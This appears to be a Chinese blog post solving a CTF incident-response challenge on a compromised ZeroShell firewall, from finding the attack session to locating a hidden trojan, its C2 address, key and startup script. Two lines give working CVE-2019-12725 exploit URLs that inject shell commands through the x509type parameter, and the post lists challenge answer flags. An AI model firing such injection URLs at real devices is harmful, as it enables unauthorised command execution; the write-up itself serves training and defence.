<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;ATMB6666&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="2024长城杯ciscn-威胁流量分析-zeroshell"><a class="markdownIt-Anchor" href="#2024长城杯ciscn-威胁流量分析-zeroshell"></a> 2024长城杯&amp;CISCN-威胁流量分析-zeroshell</h1>
<h2 id="q1-23"><a class="markdownIt-Anchor" href="#q1-23"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag&#123;xxxxxxxxx&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;exec&quot;</span><br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10200649.png" srcset="/img/loading.gif" lazyload alt="2025-03-10200649"></p>
<h2 id="q2-23"><a class="markdownIt-Anchor" href="#q2-23"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag&#123;xxxxxxxxxx&#125;<br></code></pre></td></tr></table></figure>
<p>按照docx流程进行配置，访问</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//61.139.2.100/</span><br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/630496065">zeroshell防火墙存在远程命令执行漏洞CVE-2019-12725 - 知乎</a></p>
<p>cve直接打</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Afind / -name flag%0A%27<br></code></pre></td></tr></table></figure>
<p>先找一下文件在哪</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/DB/_DB.001/flag<br></code></pre></td></tr></table></figure>
<p>然后读取就行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c6045425-<span class="hljs-number">6</span>e6e-<span class="hljs-number">41</span>d0-be09-<span class="hljs-number">95682</span>a4f65c4&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-23"><a class="markdownIt-Anchor" href="#q3-23"></a> Q3</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag&#123;xxxx&#125;，如flag&#123;www.abc.com&#125; 或 flag&#123;16.122.33.44&#125;<br></code></pre></td></tr></table></figure>
<p>执行<code>netstat -antlp</code>，搜索bash</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">202.115.89.103</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-20"><a class="markdownIt-Anchor" href="#q4-20"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">4.请写出木马进程执行的本体文件的名称，结果提交形式：flag&#123;xxxxx&#125;，仅写文件名不加路径<br></code></pre></td></tr></table></figure>
<p>在linux每个运行中的进程在/proc下都有一个对应的目录，名称为进程ID。这些目录包含了多个文件和子目录，记录了进程的状态、资源使用等信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Als /tmp -al%0A%27<br></code></pre></td></tr></table></figure>
<p>.隐藏恶意文件，在几个目录下寻找后，最终在/tmp下找到.nginx查看内容是elf开头合理怀疑</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;.nginx&#125;</span><br></code></pre></td></tr></table></figure>
<h2 id="q5-16"><a class="markdownIt-Anchor" href="#q5-16"></a> Q5</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式：flag&#123;xxxx&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xxd  -p /tmp/.nginx<br></code></pre></td></tr></table></figure>
<p>文件比较大，不太好直接提取，可以直接挂载提取文件,ida分析一会可以找到</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">11223344qweasdzxc<br></code></pre></td></tr></table></figure>
<h2 id="q6-8"><a class="markdownIt-Anchor" href="#q6-8"></a> Q6</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag&#123;xxxx&#125;，如flag&#123;/a/b/c&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-10211037.png" srcset="/img/loading.gif" lazyload alt="2025-03-10211037"></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">flag&#123;<span class="hljs-regexp">/var/</span>register<span class="hljs-regexp">/system/</span>startup<span class="hljs-regexp">/scripts/</span>nat/<span class="hljs-keyword">File</span>&#125;<br></code></pre></td></tr></table></figure>
<hr>
<h1 id="尾声"><a class="markdownIt-Anchor" href="#尾声"></a> 尾声</h1>
<p>用了三四天的时间直接刷到了前100，最近可能不会再想碰了，会转到其他方面，之后有空还是会更新的。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" class="category-chain-item">每日一题</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="print-no-link">#应急响应</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Re:从零开始的玄机的应急响应生活</div>
      <div>https://0ran9ewww.github.io/2025/03/02/每日一题/Re从零开始的玄机的应急响应生活/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>orange</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年3月2日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2025年3月10日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/03/01/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/BUUCTF-Web/" title="Re:从零开始的BUU的web生活">
                        <span class="hidden-mobile">Re:从零开始的BUU的web生活</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>
 
  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
</body>
</html>

<!--浏览器搞笑标题-->
<script type="text/javascript" src="\js\FunnyTitle.js"></script>
<!--鼠标点击礼花特效-->
<script async src="/js/fireworks.js"></script>